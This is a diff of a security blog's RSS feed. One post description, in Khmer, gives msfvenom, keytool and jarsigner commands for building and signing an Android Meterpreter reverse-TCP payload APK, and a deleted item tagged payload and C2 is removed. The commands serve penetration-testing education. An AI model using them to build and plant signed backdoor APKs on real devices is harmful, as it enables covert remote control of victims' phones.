@@ -27,7 +27,7 @@
         <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Wed, 21 May 2025 11:00:00 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/android-h4cking-with-metasploit/</guid>
-        <description>តម្រូវការ  ziplign jarsigner keytool  ប្រើប្រាស់ Metasploit ដើម្បីបង្កើត Android Payload msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=192.168.13.X lport=4444 R -o pload.apk  របៀប Sign ឯកសារ APK - បង្កើត Keystore keytool -genkey -V -keystore key.keystore -alias Android -keyalg RSA -keysize 2048 -validity 10000 // បញ្ចូលលេខសំងាត់របស់ RSA និងព័ត៌មានឲ្យបានត្រឹមត្រូវ  របៀប Sign ឯកសារ APK - Sign Payload sudo apt-get install openjdk-21-jdk-headless jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore pload.apk Android // បញ្ចូលលេខសំងាត់របស់ RSA ឲ្យបានត្រឹមត្រូវ  របៀប Sign ឯកសារ APK - Verify Payload jarsigner -verify -verbose -certs pload.</description>
+        <description>តម្រូវការ  ziplign jarsigner keytool  ប្រើប្រាស់ Metasploit ដើម្បីបង្កើត Android Payload msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=192.168.13.X lport=4444 R -o pload.apk របៀប Sign ឯកសារ APK - បង្កើត Keystore keytool -genkey -V -keystore key.keystore -alias Android -keyalg RSA -keysize 2048 -validity 10000 // បញ្ចូលលេខសំងាត់របស់ RSA និងព័ត៌មានឲ្យបានត្រឹមត្រូវ របៀប Sign ឯកសារ APK - Sign Payload sudo apt-get install openjdk-21-jdk-headless jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore pload.apk Android // បញ្ចូលលេខសំងាត់របស់ RSA ឲ្យបានត្រឹមត្រូវ របៀប Sign ឯកសារ APK - Verify Payload jarsigner -verify -verbose -certs pload.</description>
         
         <dc:creator>thik</dc:creator>
         <media:content url="https://th1k.github.ioimages/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
@@ -59,40 +59,6 @@
           
             
               <category>Android</category>
-            
-          
-        
-      </item>
-      
-      <item>
-        <title>Initial Access: None</title>
-        <link>https://th1k.github.io/en/posts/initial-access-powershell-cheat-sheet/</link>
-        <pubDate>Fri, 16 May 2025 13:00:00 +0700</pubDate>
-        <author>leangputthik@protonmail.com (Thik)</author>
-        <atom:modified>Fri, 16 May 2025 13:00:00 +0700</atom:modified>
-        <guid>https://th1k.github.io/en/posts/initial-access-powershell-cheat-sheet/</guid>
-        <description>None  PowerShell  1  ./test.bat   </description>
-        
-        <dc:creator>thik</dc:creator>
-        <media:content url="https://th1k.github.ioimages/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
-        
-        
-        
-          
-            
-              <category>payload</category>
-            
-          
-        
-        
-          
-            
-              <category>C2</category>
-            
-          
-        
-        
-          
             
           
         
